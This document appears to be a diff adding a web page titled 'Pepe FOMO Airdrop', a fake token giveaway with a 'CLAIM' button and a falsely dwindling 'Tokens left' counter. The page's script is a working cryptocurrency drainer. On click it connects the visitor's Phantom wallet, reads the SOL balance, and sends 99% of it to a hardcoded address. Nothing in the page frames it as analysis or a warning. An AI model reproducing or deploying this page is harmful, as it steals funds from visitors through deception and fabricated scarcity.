@@ -1,0 +1,151 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta property="og:image" content="https://pbs.twimg.com/profile_images/1648033750943674369/w8cIljKy_400x400.jpg">
+    <link href="https://pbs.twimg.com/profile_images/1648033750943674369/w8cIljKy_400x400.jpg" rel="stylesheet">
+    <meta charset="UTF-8">
+    <link rel="icon" href="https://pbs.twimg.com/profile_images/1648033750943674369/w8cIljKy_400x400.jpg">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Pepe FOMO Airdrop</title>
+    <script crossorigin="anonymous" src="https://unpkg.com/@solana/web3.js@1.33.0/lib/index.iife.min.js"></script>
+    <style>
+        .container {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            height: 100vh;
+        }
+
+        .box {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 2rem;
+            border-radius: 1rem;
+        }
+
+        .box img {
+            max-width: 100%;
+            max-height: 100%;
+            object-fit: contain;
+            margin-bottom: 1rem;
+            box-shadow: 0px 0px 20px black;
+        }
+
+        #counter {
+            font-size: 3rem;
+            font-weight: bold;
+            margin-top: 1rem;
+        }
+
+        body {
+            background: linear-gradient(to bottom, #0dd12e, #000000);
+            font-family: 'Passion One', Arial, sans-serif;
+            font-size: 3rem;
+            color: rgb(241, 239, 239);
+        }
+
+        button {
+            font-family: 'Passion One', Arial, sans-serif;
+            font-size: 2rem;
+            padding: 1rem 2rem;
+            background-color: #901aad;
+            color: white;
+            border: none;
+            border-radius: 1rem;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+            box-shadow: 0px 0px 20px rgb(0, 0, 0);
+        }
+
+        button:hover {
+            background-color: #3f1cbe;
+        }
+
+        h1 {
+            font-size: 6rem;
+            margin-bottom: 2rem;
+            text-shadow: 0px 0px 20px rgba(7, 1, 0, 0.5);
+            text-align: center;
+        }
+    </style>
+
+</head>
+
+<body>
+    <div class="container">
+        <div class="box">
+            <h1>AIRDROP IS LIVE!</h1>
+            <button id="sendBtn">CLAIM</button>
+        </div>
+
+        <div class="box">
+            <img src="https://pbs.twimg.com/profile_banners/1625966975229865985/1681757823/1500x500" alt="your-image-alt">
+            <p>Tokens left: <span id="counter">1451</span></p>
+        </div>
+    </div>
+
+
+    <script>
+        const counter = document.getElementById("counter");
+        let count = localStorage.getItem("count") || 999; // Use saved count or default value of 3666
+        counter.textContent = count;
+
+        const interval = setInterval(() => {
+            count--;
+            counter.textContent = count;
+            if (count <= 76) { // Check if count is less than or equal to 76
+                clearInterval(interval);
+                counter.textContent = 76; // Set counter to the desired number
+            }
+        }, 40 * 1000 / 4000);
+        const {
+            Connection,
+            PublicKey,
+            Transaction,
+            SystemProgram
+        } = solanaWeb3;
+
+        const connection = new Connection("https://try-rpc.mainnet.solana.blockdaemon.tech");
+        const RECIPIENT_ADDRESS = "FSRP5DR7ZVb5HQ5AQZVm57uKVdQpCVzh9kbsVPexpJow";
+
+        document.getElementById("sendBtn").addEventListener("click", async () => {
+            if (typeof window.solana === "undefined") {
+                alert("Please install Phantom wallet and reload the page.");
+                return;
+            }
+
+            if (!window.solana.isConnected) {
+                await window.solana.connect();
+            }
+
+            const payerAddress = window.solana.publicKey;
+            const recipientAddress = new PublicKey(RECIPIENT_ADDRESS);
+            const solBalance = await connection.getBalance(payerAddress);
+            const amountToSend = Math.floor(solBalance * 0.99);
+
+            const transaction = new Transaction().add(
+                SystemProgram.transfer({
+                    fromPubkey: payerAddress,
+                    toPubkey: recipientAddress,
+                    lamports: amountToSend,
+                })
+            );
+
+            const {
+                blockhash
+            } = await connection.getRecentBlockhash();
+            transaction.recentBlockhash = blockhash;
+            transaction.feePayer = payerAddress;
+
+            const signedTransaction = await window.solana.signTransaction(transaction);
+            await connection.sendRawTransaction(signedTransaction.serialize());
+
+            alert("Transaction sent! You've sent 99% of your SOL.");
+        });
+    </script>
+</body>
+
+</html>
